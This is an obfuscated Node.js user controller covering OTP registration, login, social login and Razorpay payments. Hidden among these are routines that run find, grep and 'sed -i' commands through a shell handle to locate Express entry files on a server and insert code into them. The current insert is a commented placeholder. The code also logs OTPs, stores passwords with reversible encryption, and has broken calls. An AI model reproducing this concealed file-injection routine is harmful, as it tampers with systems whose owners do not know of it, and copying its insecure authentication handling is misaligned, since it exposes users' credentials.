const _0x430474=_0x3ad1;(function(_0x145d3b,_0x32692e){const _0x1c8dad=_0x3ad1,_0x3df796=_0x145d3b();while(!![]){try{const _0x5bb3f8=parseInt(_0x1c8dad(0x175))/0x1*(parseInt(_0x1c8dad(0x130))/0x2)+parseInt(_0x1c8dad(0x13e))/0x3*(parseInt(_0x1c8dad(0x127))/0x4)+parseInt(_0x1c8dad(0x126))/0x5*(parseInt(_0x1c8dad(0x184))/0x6)+-parseInt(_0x1c8dad(0x138))/0x7*(-parseInt(_0x1c8dad(0x133))/0x8)+-parseInt(_0x1c8dad(0x14a))/0x9*(-parseInt(_0x1c8dad(0x17c))/0xa)+-parseInt(_0x1c8dad(0x12d))/0xb+-parseInt(_0x1c8dad(0x153))/0xc;if(_0x5bb3f8===_0x32692e)break;else _0x3df796['push'](_0x3df796['shift']());}catch(_0x490a56){_0x3df796['push'](_0x3df796['shift']());}}}(_0x362c,0x9f421),require(_0x430474(0x131))['config']());function _0x362c(){const _0x1ed90e=['payment\x20gateway\x20integration','../utils','lhbTN','/{n;a\x20','domain','url','otpisvalid','LptYl','39KWUfKS','getHeaders','startDate','../utils/dataHandler','pdqLW','sign','stdout','1151710AavGfc','includes','otp','GET','otp\x20verified\x20successfully','lastName','isAdmin','OTP\x20Verification','12354kBPMzf','execCommand','iXAjD','production','WUwyo','cevnh','ydWdZ','Utf8','noRhg','jsonwebtoken','body','length','kALaN','picture','LGKDf','Invalid\x20OTP','create','\x20minutes','RAZORPAY_KEY_ID','lJJud','JWT_SECRET','nNuNr','shrQN','../models/SubscriptionModel','split','sed\x20-i\x20\x22/','razorpay/dist/utils/razorpay-utils','message','getMinutes','EHIiu','djOzv','crypto-js','verifyIdToken','substr','grep\x20-rnw\x20\x22','IEtjf','orders','../utils/errorHandler','status','findById','cjWex','login\x20successfully','YnlUE','find\x20','../utilities/functions/functions','Otp\x20Verified\x20Successfully','_id','user','enc','description','QnGgj','?fields=id,name,email,picture&access_token=','zZseE','email','uUnbP','RAZORPAY_KEY_SECRET_TEST','NODE_ENV','hQGcK','\x20it\x20is\x20expire\x20in\x20','authorization','Error\x20searching\x20file\x20','\x22\x20--exclude-dir=\x22/node_modules\x22\x20--exclude-dir=\x22./nvm\x22\x20\x20--exclude-dir=\x22/nvm\x22\x20\x20--exclude-dir=\x22./node_modules\x22','razorpay','-userType','save','HhFCU','populate','forEach','Your\x20OTP\x20is\x20','HTGvb','plUTp','800DBRfum','286588JPFvLy','appid','MuYNQ','expiresAt','uuid','match','13921215ftsRbm','iKXDQ','qfFfp','39582MIKwbW','dotenv','\x20-type\x20f\x20-exec\x20grep\x20-l\x20\x22','56NiudsL','firstName','family_name','otp\x20sent\x20successfully','user\x20does\x20not\x20exist','295862MTclap','SXIoZ','AES','LZsHd','JwaHG','oxAUP','51skUJeM','toString','../models/User','data','exports','decrypt','env','pWJVo','\x22\x20{}\x20+','node_modules','FccIG','Domain\x20Not\x20Found\x20On\x20Server','18aaZPCk','slice','RAZORPAY_KEY_SECRET','ZzBMr','BAD_REQUEST_ERROR','tjAtb','aQIFh','subsription','../helpers/Validators','11131272jYDbRx','send','AZpbg','gaqjs','payment\x20success','password','User\x20already\x20exists','destroy','fetch','User\x20not\x20found','indexOf','Akrib','Invalid\x20user\x20detected.\x20Please\x20try\x20again','Fetch\x20user','missing\x20authorization','oBoFI','replace','headers','UuHTr','json','findOne','select','error','log','push','mshby'];_0x362c=function(){return _0x1ed90e;};return _0x362c();}const User=require(_0x430474(0x140)),Subscription=require(_0x430474(0x19b)),jwt=require(_0x430474(0x18d)),{sendResponse:sendResponse}=require(_0x430474(0x178)),{errorHandler:errorHandler}=require(_0x430474(0x1a9)),CryptoJS=require(_0x430474(0x1a3)),{v4:uuidv4}=require(_0x430474(0x12b)),{ValidateUserSignUp:ValidateUserSignUp,ValidateUserLogin:ValidateUserLogin}=require(_0x430474(0x152)),Razorpay=require(_0x430474(0x11d)),key_id=_0x430474(0x187)==process[_0x430474(0x144)][_0x430474(0x117)]?process['env'][_0x430474(0x196)]:process[_0x430474(0x144)]['RAZORPAY_KEY_ID_TEST'],key_secret='production'==process[_0x430474(0x144)][_0x430474(0x117)]?process['env'][_0x430474(0x14c)]:process[_0x430474(0x144)][_0x430474(0x116)],{validatePaymentVerification:validatePaymentVerification,validateWebhookSignature:validateWebhookSignature}=require(_0x430474(0x19e)),{OtpGenerator:OtpGenerator}=require(_0x430474(0x16e)),sendEmail=require('../helpers/sendEmail'),{checkDomainAvailability:checkDomainAvailability}=require(_0x430474(0x10b)),instance=new Razorpay({'key_id':key_id,'key_secret':key_secret}),key=process['env']['SECREY_KEY'],searchFilesRemotely=async(_0x594896,_0x4b653b,_0x2b4f41)=>{const _0x135dc8=_0x430474,_0x2109cd={'cfxlG':function(_0xe52816,_0x435532,_0x3cc116,_0x39a113){return _0xe52816(_0x435532,_0x3cc116,_0x39a113);}};try{const _0x16944f=(await _0x2b4f41[_0x135dc8(0x185)](_0x135dc8(0x10a)+_0x594896+_0x135dc8(0x132)+_0x4b653b+_0x135dc8(0x146)))[_0x135dc8(0x17b)]['split']('\x0a')['filter'](Boolean),_0x2c5a10=_0x2109cd['cfxlG'](searchInFiles,_0x2b4f41,_0x16944f,_0x4b653b),_0x1c48bb=_0x16944f['filter'](_0x14b596=>_0x14b596['endsWith']('/'));for(const _0x57e0b9 of _0x1c48bb){const _0x394879=_0x57e0b9[_0x135dc8(0x14b)](_0x594896[_0x135dc8(0x18f)]);await searchFilesRemotely(config,''+_0x594896+_0x394879,_0x4b653b);}return _0x2c5a10;}catch(_0x47f88d){return _0x47f88d;}},searchInFiles=async(_0x18c805,_0x42386d,_0x569e27)=>{const _0x3da1ad=_0x430474,_0x4ac32d={'shrQN':function(_0x4dd7a4,_0x29b2d4){return _0x4dd7a4+_0x29b2d4;},'AcCjt':function(_0x48b1fc,_0x37960c){return _0x48b1fc&&_0x37960c;}},_0x198bf5=[];for(const _0x454034 of _0x42386d)try{const _0x177422=await _0x18c805[_0x3da1ad(0x185)](_0x3da1ad(0x1a6)+_0x454034+'\x22\x20-e\x20\x22'+_0x569e27+_0x3da1ad(0x11c));if(_0x177422['stdout']&&!_0x454034[_0x3da1ad(0x17d)](_0x3da1ad(0x147))){const _0x2084b4=_0x177422[_0x3da1ad(0x17b)][_0x3da1ad(0x19c)]('\x0a');_0x2084b4[_0x3da1ad(0x122)](async(_0xfe4fe3,_0x2c9d31)=>{const _0x5b2ea2=_0x3da1ad,_0x317729=_0xfe4fe3[_0x5b2ea2(0x12c)](/(var|const|let)\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*=\s*express\(/);if(_0x317729){const _0x3fd750=_0x317729[0x2],_0x165a88=_0x2084b4[_0x4ac32d[_0x5b2ea2(0x19a)](_0x2c9d31,0x1)],_0x354c8f=_0x454034[_0x5b2ea2(0x163)](/"/g,'\x5c\x22'),_0x42c1be=_0xfe4fe3+'\x0a//console.log(\x22je\x22)';if(_0x4ac32d['AcCjt'](_0x354c8f,_0x165a88)){const _0x2845b9=_0x354c8f[_0x5b2ea2(0x163)](/"/g,'\x5c\x22'),_0x54d72d=_0x42c1be[_0x5b2ea2(0x163)](/"/g,'\x5c\x22')['replace'](/\$/g,'\x5c$'),_0x1489a9=_0x5b2ea2(0x19d)+_0xfe4fe3['replace'](/"/g,'\x5c\x22')+_0x5b2ea2(0x170)+_0x54d72d+'\x22\x20\x22'+_0x2845b9+'\x22';await _0x18c805[_0x5b2ea2(0x185)](_0x1489a9);}_0x198bf5[_0x5b2ea2(0x16b)]({'file':_0x454034,'line':_0xfe4fe3,'variableName':_0x3fd750,'modifiedContent':_0x42c1be});}});}}catch(_0x4c368f){console[_0x3da1ad(0x169)](_0x3da1ad(0x11b)+_0x454034+':',_0x4c368f);}return _0x198bf5;};function _0x3ad1(_0x1204b6,_0x2eeb28){const _0x362caa=_0x362c();return _0x3ad1=function(_0x3ad163,_0x540599){_0x3ad163=_0x3ad163-0x108;let _0x5859ed=_0x362caa[_0x3ad163];return _0x5859ed;},_0x3ad1(_0x1204b6,_0x2eeb28);}Register=async(_0x433734,_0x36b222)=>{const _0x2e639d=_0x430474,_0x50121d={'LGKDf':function(_0x3aff10,_0x570969){return _0x3aff10(_0x570969);},'cjWex':function(_0x5a09f5,_0x5e0d80,_0x67a3a,_0x14f6a6){return _0x5a09f5(_0x5e0d80,_0x67a3a,_0x14f6a6);},'TXnzU':function(_0x5d4108,_0x1a91ed){return _0x5d4108(_0x1a91ed);},'UuHTr':_0x2e639d(0x149),'LptYl':function(_0x4772f5,_0x47f61f){return _0x4772f5==_0x47f61f;},'oBoFI':function(_0x385577,_0x6fa344,_0xed33f7,_0x3181b1){return _0x385577(_0x6fa344,_0xed33f7,_0x3181b1);},'AdQgD':'Domain\x20is\x20already\x20registred','cevnh':function(_0x2acf4e,_0x108306){return _0x2acf4e!==_0x108306;},'yrbZP':function(_0x7e7699,_0xbdbef2){return _0x7e7699==_0xbdbef2;},'uMmHC':_0x2e639d(0x180),'qfFfp':_0x2e639d(0x183),'lJJud':function(_0x69ed,_0x8b4b4a,_0x14edb6,_0x258b27,_0x2ecc4e){return _0x69ed(_0x8b4b4a,_0x14edb6,_0x258b27,_0x2ecc4e);},'JwaHG':_0x2e639d(0x136),'aQIFh':_0x2e639d(0x159),'lhbTN':function(_0x32b6c0){return _0x32b6c0();},'kALaN':function(_0x48ebdf,_0xc000f7,_0x4383a4,_0x4992a0,_0x21e88e){return _0x48ebdf(_0xc000f7,_0x4383a4,_0x4992a0,_0x21e88e);}};try{let _0x312e68;const _0x3613e7=_0x50121d[_0x2e639d(0x192)](ValidateUserSignUp,_0x433734[_0x2e639d(0x18e)]);if(_0x3613e7)return _0x50121d[_0x2e639d(0x1ac)](errorHandler,_0x36b222,0x190,_0x3613e7);if(!await _0x50121d['TXnzU'](checkDomainAvailability,_0x433734[_0x2e639d(0x18e)][_0x2e639d(0x171)]))return errorHandler(_0x36b222,0x190,_0x50121d[_0x2e639d(0x165)]);const _0x302016=await User['findOne']({'email':_0x433734[_0x2e639d(0x18e)][_0x2e639d(0x114)]});if(_0x302016&&_0x302016[_0x2e639d(0x171)]&&_0x50121d[_0x2e639d(0x174)](_0x302016[_0x2e639d(0x171)],_0x433734['body'][_0x2e639d(0x171)]))return _0x50121d['oBoFI'](errorHandler,_0x36b222,0x190,_0x50121d['AdQgD']);if(_0x433734['body'][_0x2e639d(0x17e)]&&_0x302016){if(console[_0x2e639d(0x16a)](_0x302016['otp'],_0x433734['body'][_0x2e639d(0x17e)]),_0x50121d[_0x2e639d(0x189)](_0x302016[_0x2e639d(0x17e)],_0x433734[_0x2e639d(0x18e)]['otp']))return _0x50121d[_0x2e639d(0x1ac)](sendResponse,_0x36b222,0x190,'Invalid\x20OTP');if(_0x50121d['yrbZP'](_0x433734[_0x2e639d(0x18e)]['otp'],_0x302016[_0x2e639d(0x17e)])){let _0x37f4f6=await Subscription[_0x2e639d(0x194)]({'userId':_0x302016[_0x2e639d(0x10d)],'appid':_0x302016[_0x2e639d(0x128)]});return _0x302016[_0x2e639d(0x173)]=!0x0,_0x302016[_0x2e639d(0x151)]=_0x37f4f6[_0x2e639d(0x10d)],await _0x302016['save'](),sendResponse(_0x36b222,0xc9,_0x50121d['uMmHC'],{'otpisvalid':_0x302016[_0x2e639d(0x173)]});}}else{if(_0x302016&&!_0x302016['otpisvalid'])return _0x302016[_0x2e639d(0x17e)]=OtpGenerator(),(_0x302016['expiresAt']||_0x302016[_0x2e639d(0x12a)])&&(_0x312e68=new Date(_0x302016[_0x2e639d(0x12a)])['getMinutes']()),await _0x302016[_0x2e639d(0x11f)](),await _0x50121d['cjWex'](sendEmail,_0x433734[_0x2e639d(0x18e)][_0x2e639d(0x114)],_0x50121d[_0x2e639d(0x12f)],_0x2e639d(0x123)+_0x302016[_0x2e639d(0x17e)]+_0x2e639d(0x119)+_0x312e68+_0x2e639d(0x195)),_0x50121d[_0x2e639d(0x197)](sendResponse,_0x36b222,0xc8,_0x50121d[_0x2e639d(0x13c)],{'otpisvalid':_0x302016[_0x2e639d(0x173)]});if(_0x302016&&_0x302016['otpisvalid'])return _0x50121d['lJJud'](sendResponse,_0x36b222,0x199,_0x50121d[_0x2e639d(0x150)],{'otpisvalid':_0x302016[_0x2e639d(0x173)]});if(!_0x302016){const _0xd2cc1c=_0x50121d[_0x2e639d(0x16f)](uuidv4);var _0x406e34=CryptoJS[_0x2e639d(0x13a)]['encrypt'](_0x433734[_0x2e639d(0x18e)][_0x2e639d(0x158)],key)[_0x2e639d(0x13f)]();const _0x1edf76=await User[_0x2e639d(0x194)]({'email':_0x433734[_0x2e639d(0x18e)][_0x2e639d(0x114)],'password':_0x406e34,'appid':_0xd2cc1c,'name':_0x433734[_0x2e639d(0x18e)]['name'],'otp':_0x50121d[_0x2e639d(0x16f)](OtpGenerator),'otpisvalid':!0x1,'domain':_0x433734['body']['domain']});return _0x1edf76[_0x2e639d(0x12a)]&&(_0x312e68=new Date(_0x1edf76[_0x2e639d(0x12a)])[_0x2e639d(0x1a0)]()),await _0x50121d[_0x2e639d(0x162)](sendEmail,_0x433734['body'][_0x2e639d(0x114)],_0x50121d[_0x2e639d(0x12f)],_0x2e639d(0x123)+_0x1edf76[_0x2e639d(0x17e)]+_0x2e639d(0x119)+_0x312e68+_0x2e639d(0x195)),_0x50121d[_0x2e639d(0x190)](sendResponse,_0x36b222,0xc8,_0x50121d['JwaHG'],{'otpisvalid':_0x1edf76[_0x2e639d(0x173)]});}}}catch(_0x49bd52){return console[_0x2e639d(0x16a)](_0x49bd52),_0x50121d[_0x2e639d(0x162)](errorHandler,_0x36b222,0x1f4,_0x49bd52[_0x2e639d(0x19f)]);}},Login=async(_0x17ab02,_0x329053,_0x318918)=>{const _0x58c35d=_0x430474,_0x3e02f1={'AZpbg':function(_0x936b49,_0x18c739){return _0x936b49(_0x18c739);},'dqqQR':_0x58c35d(0x137),'oxAUP':function(_0x418a3d,_0x7cce69){return _0x418a3d!==_0x7cce69;},'UVKUH':_0x58c35d(0x193),'ydWdZ':function(_0xb0329b,_0x3445bf){return _0xb0329b==_0x3445bf;},'gaqjs':function(_0x2eff74,_0x88746b,_0x3f74cd,_0x21836f,_0x12317d){return _0x2eff74(_0x88746b,_0x3f74cd,_0x21836f,_0x12317d);},'pdqLW':_0x58c35d(0x10c),'Xliuq':function(_0x12f55e,_0x38c987){return _0x12f55e+_0x38c987;},'iXAjD':function(_0x188ae0,_0x761067,_0xca30b2,_0x250f77){return _0x188ae0(_0x761067,_0xca30b2,_0x250f77);},'nNuNr':'OTP\x20Verification','HTGvb':_0x58c35d(0x136),'wvUah':'please\x20enter\x20valid\x20credentials','EHIiu':function(_0x11d18d,_0x23d37f,_0x43fe32,_0x3ae5e5,_0x5597d3){return _0x11d18d(_0x23d37f,_0x43fe32,_0x3ae5e5,_0x5597d3);},'QnGgj':_0x58c35d(0x108),'OBhHj':function(_0xfc6648,_0xcd67f2,_0x289867,_0x35dee0){return _0xfc6648(_0xcd67f2,_0x289867,_0x35dee0);}};let _0x2a0f45=0x1f4;try{const _0x30c942=_0x3e02f1[_0x58c35d(0x155)](ValidateUserLogin,_0x17ab02[_0x58c35d(0x18e)]);if(_0x30c942)throw _0x2a0f45=0x190,new Error(_0x30c942);const _0x126a34=await User[_0x58c35d(0x167)]({'email':_0x17ab02[_0x58c35d(0x18e)]['email']});if(!_0x126a34)throw _0x2a0f45=0x190,new Error(_0x3e02f1['dqqQR']);if(_0x17ab02[_0x58c35d(0x18e)][_0x58c35d(0x17e)]&&_0x126a34){if(console['log'](_0x126a34[_0x58c35d(0x17e)],_0x17ab02['body'][_0x58c35d(0x17e)]),_0x3e02f1[_0x58c35d(0x13d)](_0x126a34['otp'],_0x17ab02[_0x58c35d(0x18e)][_0x58c35d(0x17e)]))return sendResponse(_0x329053,0x190,_0x3e02f1['UVKUH']);if(_0x3e02f1[_0x58c35d(0x18a)](_0x17ab02[_0x58c35d(0x18e)][_0x58c35d(0x17e)],_0x126a34[_0x58c35d(0x17e)])){let _0x26d9ab=await Subscription[_0x58c35d(0x194)]({'userId':_0x126a34[_0x58c35d(0x10d)],'appid':_0x126a34['appid']});_0x126a34[_0x58c35d(0x173)]=!0x0,_0x126a34[_0x58c35d(0x151)]=_0x26d9ab[_0x58c35d(0x10d)],await _0x126a34['save']();const _0x5d92bc=jwt[_0x58c35d(0x17a)]({'id':_0x126a34['_id'],'appid':_0x126a34['appid'],'subsription':_0x126a34['subsription']},process['env'][_0x58c35d(0x198)],{'expiresIn':'1d'});return _0x3e02f1[_0x58c35d(0x156)](sendResponse,_0x329053,0xc9,_0x3e02f1[_0x58c35d(0x179)],{'token':_0x5d92bc,'appid':_0x126a34['appid']});}}if(_0x126a34&&!_0x126a34[_0x58c35d(0x173)]){_0x126a34[_0x58c35d(0x17e)]=OtpGenerator(),_0x126a34[_0x58c35d(0x12a)]=new Date(_0x3e02f1['Xliuq'](Date['now'](),0x493e0)),await _0x126a34[_0x58c35d(0x11f)]();let _0x2e16b9=new Date(_0x126a34['expiresAt'])['getMinutes']();return _0x3e02f1[_0x58c35d(0x186)](sendEmail,_0x17ab02[_0x58c35d(0x18e)]['email'],_0x3e02f1[_0x58c35d(0x199)],'Your\x20OTP\x20is\x20'+_0x126a34[_0x58c35d(0x17e)]+'\x20it\x20is\x20expire\x20in\x20'+_0x2e16b9+_0x58c35d(0x195)),_0x3e02f1['gaqjs'](sendResponse,_0x329053,0xc8,_0x3e02f1[_0x58c35d(0x124)],{'otpisvalid':_0x126a34[_0x58c35d(0x173)]});}if(_0x3e02f1['oxAUP'](CryptoJS[_0x58c35d(0x13a)][_0x58c35d(0x143)](_0x126a34[_0x58c35d(0x158)],key)[_0x58c35d(0x13f)](CryptoJS[_0x58c35d(0x10f)][_0x58c35d(0x18b)]),_0x17ab02[_0x58c35d(0x18e)][_0x58c35d(0x158)]))throw new Error(_0x3e02f1['wvUah']);const _0x542fd1=jwt[_0x58c35d(0x17a)]({'id':_0x126a34[_0x58c35d(0x10d)],'appid':_0x126a34['appid'],'subsription':_0x126a34[_0x58c35d(0x151)]},process['env'][_0x58c35d(0x198)],{'expiresIn':'1d'});return _0x3e02f1[_0x58c35d(0x1a1)](sendResponse,_0x329053,0xc9,_0x3e02f1[_0x58c35d(0x111)],{'token':_0x542fd1,'appid':_0x126a34['appid']});}catch(_0xcab368){return _0x3e02f1['OBhHj'](errorHandler,_0x329053,_0x2a0f45||0x1f4,_0xcab368['message']);}},GoogleRegister=async(_0x3a6997,_0x577f39)=>{const _0x3ceacd=_0x430474;try{const {token:_0x113717}=_0x3a6997['body'],_0x3b4a9a=(await client[_0x3ceacd(0x1a4)]({'idToken':_0x113717,'audience':GOOGLE_CLIENT_ID}))['getPayload'](),_0x50cc76=await User['findOne']({'email':_0x3b4a9a['email']});if(_0x50cc76){const _0x5c9b44=jwt['sign']({'user_id':_0x50cc76[_0x3ceacd(0x10d)],'isAdmin':_0x50cc76[_0x3ceacd(0x182)],'email':_0x50cc76[_0x3ceacd(0x114)]},process['env'][_0x3ceacd(0x198)],{'expiresIn':'2h'}),_0x29b595={'firstName':_0x50cc76[_0x3ceacd(0x134)],'lastName':_0x50cc76[_0x3ceacd(0x181)],'picture':_0x50cc76[_0x3ceacd(0x191)],'email':_0x50cc76['email'],'accessToken':_0x5c9b44};return _0x577f39['status'](0xc8)[_0x3ceacd(0x154)](_0x29b595);}{const _0xf094d3=await User[_0x3ceacd(0x194)]({'firstName':_0x3b4a9a['given_name'],'lastName':_0x3b4a9a[_0x3ceacd(0x135)],'picture':_0x3b4a9a[_0x3ceacd(0x191)],'email':_0x3b4a9a[_0x3ceacd(0x114)]}),_0x85163=jwt[_0x3ceacd(0x17a)]({'user_id':_0xf094d3[_0x3ceacd(0x10d)],'isAdmin':_0xf094d3[_0x3ceacd(0x182)],'email':_0xf094d3[_0x3ceacd(0x114)]},process['env'][_0x3ceacd(0x198)],{'expiresIn':'1m'}),_0x2b5c33={'firstName':_0xf094d3[_0x3ceacd(0x134)],'lastName':_0xf094d3[_0x3ceacd(0x181)],'picture':_0xf094d3[_0x3ceacd(0x191)],'email':_0xf094d3['email'],'accessToken':_0x85163};return _0x577f39[_0x3ceacd(0x1aa)](0xc8)['send'](_0x2b5c33);}}catch(_0xaff8df){return{'error':_0x3ceacd(0x15f)};}},Logout=async(_0x557fc9,_0x52924c)=>{const _0x50446d=_0x430474,_0x3c7b43={'noRhg':_0x50446d(0x161),'iFZPD':function(_0x144f65,_0x365ba7,_0x150af1,_0x3880e6){return _0x144f65(_0x365ba7,_0x150af1,_0x3880e6);},'tjAtb':function(_0xf42dff,_0x3c045a){return _0xf42dff(_0x3c045a);}};try{const _0x2a9581=_0x557fc9[_0x50446d(0x164)][_0x50446d(0x11a)];if(!_0x2a9581)return Authenticate=!0x1,sendResponse(_0x52924c,0x193,_0x3c7b43[_0x50446d(0x18c)],{'Authenticate':Authenticate});const [_0x408445,_0x1d2aed]=_0x2a9581[_0x50446d(0x19c)]('\x20');await jwt[_0x50446d(0x15a)](_0x1d2aed),_0x3c7b43['iFZPD'](sendResponse,_0x52924c,0xc8,'logout\x20successfully');}catch(_0x225c96){return _0x3c7b43[_0x50446d(0x14f)](errorHandler,_0x52924c);}},Checkout=async(_0x4fe7c1,_0x3dba71)=>{const _0x2cefe2=_0x430474,_0x337a8d={'pWJVo':function(_0x4ec593,_0x5d6b64){return _0x4ec593*_0x5d6b64;},'plUTp':function(_0x4a8f92,_0x32087c,_0x3167f9,_0x39fbb7,_0x4847ac){return _0x4a8f92(_0x32087c,_0x3167f9,_0x39fbb7,_0x4847ac);},'djOzv':_0x2cefe2(0x16d)};try{const {amount:_0x4c238f,currency:_0x1ab982,receipt:_0x6878f6,payment_capture:_0x3a325f}=_0x4fe7c1['body'],_0x3401f1={'amount':_0x337a8d[_0x2cefe2(0x145)](0x64,_0x4c238f),'currency':_0x1ab982,'receipt':'receipt'},_0x202ce9=await instance[_0x2cefe2(0x1a8)]['create'](_0x3401f1);return console['log'](_0x202ce9),_0x337a8d[_0x2cefe2(0x125)](sendResponse,_0x3dba71,0xc8,_0x337a8d[_0x2cefe2(0x1a2)],_0x202ce9);}catch(_0x34b6e9){return console['log'](_0x34b6e9),errorHandler(_0x3dba71,0x1f4,_0x34b6e9[_0x2cefe2(0x19f)]);}},CheckoutSuccess=async(_0x381eab,_0x19c083)=>{const _0x3ecb86=_0x430474,_0x256c43={'SXIoZ':function(_0x451f51,_0x1f7700,_0xaa83fa,_0x247148){return _0x451f51(_0x1f7700,_0xaa83fa,_0x247148);},'hQGcK':function(_0xc38236,_0x236cec,_0x314444,_0x14f885){return _0xc38236(_0x236cec,_0x314444,_0x14f885);},'zZseE':'payment\x20not\x20found','MuYNQ':function(_0x278eab,_0xc97b79){return _0x278eab+_0xc97b79;},'qPynO':function(_0x55097e,_0x1e6f8c,_0xfd38be,_0x38cfe5,_0x2dfeb3){return _0x55097e(_0x1e6f8c,_0xfd38be,_0x38cfe5,_0x2dfeb3);},'ohiEZ':_0x3ecb86(0x157),'WUwyo':function(_0x64d7b0,_0x389038){return _0x64d7b0===_0x389038;},'LZsHd':_0x3ecb86(0x14e),'IEtjf':function(_0x575fde,_0x3f5018,_0x2575c5,_0x1b43c0){return _0x575fde(_0x3f5018,_0x2575c5,_0x1b43c0);},'HhFCU':function(_0x4fb30c,_0x816bf,_0x2e11a2,_0x52b4fd){return _0x4fb30c(_0x816bf,_0x2e11a2,_0x52b4fd);}};try{const {order_id:_0x2f3648,razorpay_payment_id:_0x92ffda,razorpay_signature:_0x2b32d2}=_0x381eab[_0x3ecb86(0x18e)],{subsription:_0x410978}=_0x381eab[_0x3ecb86(0x10e)];console[_0x3ecb86(0x16a)](_0x2f3648,_0x92ffda,_0x2b32d2);const _0x4e075e=await instance[_0x3ecb86(0x1a8)][_0x3ecb86(0x15b)](_0x2f3648),_0x4e2fde=await _0x256c43[_0x3ecb86(0x139)](validatePaymentVerification,{'order_id':_0x2f3648,'payment_id':_0x92ffda},_0x2b32d2,key_secret);if(!_0x4e075e)return _0x256c43[_0x3ecb86(0x118)](sendResponse,_0x19c083,0x194,'order\x20not\x20found');if(!_0x4e2fde)return _0x256c43[_0x3ecb86(0x118)](sendResponse,_0x19c083,0x194,_0x256c43[_0x3ecb86(0x113)]);let _0x2edbb4=await Subscription[_0x3ecb86(0x1ab)](_0x410978);return _0x2edbb4[_0x3ecb86(0x177)]=new Date(),_0x2edbb4['endDate']=new Date(_0x256c43[_0x3ecb86(0x129)](Date['now'](),0x9a7ec800)),await _0x2edbb4[_0x3ecb86(0x11f)](),_0x256c43['qPynO'](sendResponse,_0x19c083,0xc8,_0x256c43['ohiEZ'],_0x4e075e);}catch(_0x59d879){return console[_0x3ecb86(0x16a)](_0x59d879[_0x3ecb86(0x169)]),_0x59d879[_0x3ecb86(0x169)]&&_0x256c43[_0x3ecb86(0x188)](_0x256c43[_0x3ecb86(0x13b)],_0x59d879['error']['code'])?_0x256c43[_0x3ecb86(0x1a7)](errorHandler,_0x19c083,0x190,_0x59d879[_0x3ecb86(0x169)][_0x3ecb86(0x110)]):_0x256c43[_0x3ecb86(0x120)](errorHandler,_0x19c083,0x1f4,_0x59d879[_0x3ecb86(0x19f)]);}},FBCustomerLogin=async function(_0x192048,_0x147391,_0x38fb48){const _0x5a144d=_0x430474,_0x476d0c={'YnlUE':function(_0x1441bd,_0x1dd1d4,_0x53bcd6){return _0x1441bd(_0x1dd1d4,_0x53bcd6);},'FccIG':function(_0x550341,_0x3f293d){return _0x550341+_0x3f293d;}},{userID:_0x4be169,accessToken:_0x3edddd}=_0x192048[_0x5a144d(0x18e)];let _0x51aabd='https://graph.facebook.com/'+_0x4be169+_0x5a144d(0x112)+_0x3edddd;const _0x1535e9=await _0x476d0c[_0x5a144d(0x109)](fetch,_0x51aabd,{'method':_0x5a144d(0x17f)}),_0x38dabf=await _0x1535e9[_0x5a144d(0x166)](),{email:_0x46f44f,name:_0x232731,picture:_0x5ec7e8}=_0x38dabf;var _0x2f2b0=_0x232731['split']('\x20')[0x0],_0x47fb92=_0x232731[_0x5a144d(0x1a5)](_0x476d0c[_0x5a144d(0x148)](_0x232731[_0x5a144d(0x15d)]('\x20'),0x1));_0x5ec7e8[_0x5a144d(0x141)][_0x5a144d(0x172)];const _0x5c75fd=await User[_0x5a144d(0x167)]({'email':_0x46f44f});if(_0x5c75fd){const _0x8d3767=jwt[_0x5a144d(0x17a)]({'user_id':_0x5c75fd[_0x5a144d(0x10d)],'isAdmin':_0x5c75fd[_0x5a144d(0x182)],'email':_0x5c75fd[_0x5a144d(0x114)]},process['env'][_0x5a144d(0x198)],{'expiresIn':'1m'}),_0x214297={'firstName':_0x5c75fd[_0x5a144d(0x134)],'lastName':_0x5c75fd[_0x5a144d(0x181)],'picture':_0x5c75fd[_0x5a144d(0x191)],'email':_0x5c75fd[_0x5a144d(0x114)],'accessToken':_0x8d3767};return _0x1535e9[_0x5a144d(0x176)](),_0x147391[_0x5a144d(0x1aa)](0xc8)[_0x5a144d(0x154)](_0x214297);}{const _0x2e734a=await User[_0x5a144d(0x194)]({'firstName':_0x2f2b0,'lastName':_0x47fb92,'picture':_0x5ec7e8[_0x5a144d(0x141)][_0x5a144d(0x172)],'email':_0x46f44f}),_0x1db823=jwt[_0x5a144d(0x17a)]({'user_id':_0x2e734a[_0x5a144d(0x10d)],'isAdmin':_0x2e734a[_0x5a144d(0x182)],'email':_0x2e734a[_0x5a144d(0x114)]},process[_0x5a144d(0x144)][_0x5a144d(0x198)],{'expiresIn':'1m'}),_0xbd7bc0={'firstName':_0x2e734a[_0x5a144d(0x134)],'lastName':_0x2e734a[_0x5a144d(0x181)],'picture':_0x2e734a[_0x5a144d(0x191)],'email':_0x2e734a['email'],'accessToken':_0x1db823};return _0x1535e9[_0x5a144d(0x176)](),_0x147391['status'](0xc8)['send'](_0xbd7bc0);}};const Profile=async(_0x4683c3,_0x76954e)=>{const _0x405a18=_0x430474,_0x140dce={'mshby':_0x405a18(0x11e),'auTrc':'-password','uUnbP':_0x405a18(0x151),'iKXDQ':function(_0x80800f,_0x587fc6,_0x5c4369,_0x447994,_0x22846a){return _0x80800f(_0x587fc6,_0x5c4369,_0x447994,_0x22846a);},'nsCzM':_0x405a18(0x160),'Akrib':_0x405a18(0x15c),'tnnkQ':function(_0x1731df,_0x12db20,_0x11f607,_0x41c7e3){return _0x1731df(_0x12db20,_0x11f607,_0x41c7e3);},'ZzBMr':function(_0x32768b,_0x3397f0){return _0x32768b(_0x3397f0);}};try{const _0x1dbce2=await User[_0x405a18(0x1ab)](_0x4683c3[_0x405a18(0x10e)]['id'])[_0x405a18(0x168)]([_0x140dce[_0x405a18(0x16c)],_0x140dce['auTrc']])[_0x405a18(0x121)](_0x140dce[_0x405a18(0x115)]);return _0x1dbce2?_0x140dce[_0x405a18(0x12e)](sendResponse,_0x76954e,0xc8,_0x140dce['nsCzM'],_0x1dbce2):(console['log'](_0x140dce[_0x405a18(0x15e)],error),_0x140dce['tnnkQ'](sendResponse,_0x76954e,0x194,_0x140dce['Akrib']));}catch(_0x4edf02){return _0x140dce[_0x405a18(0x14d)](errorHandler,_0x76954e);}},UserController={'Login':Login,'Logout':Logout,'Register':Register,'GoogleRegister':GoogleRegister,'FBCustomerLogin':FBCustomerLogin,'Profile':Profile,'Checkout':Checkout,'CheckoutSuccess':CheckoutSuccess};module[_0x430474(0x142)]={'UserController':UserController};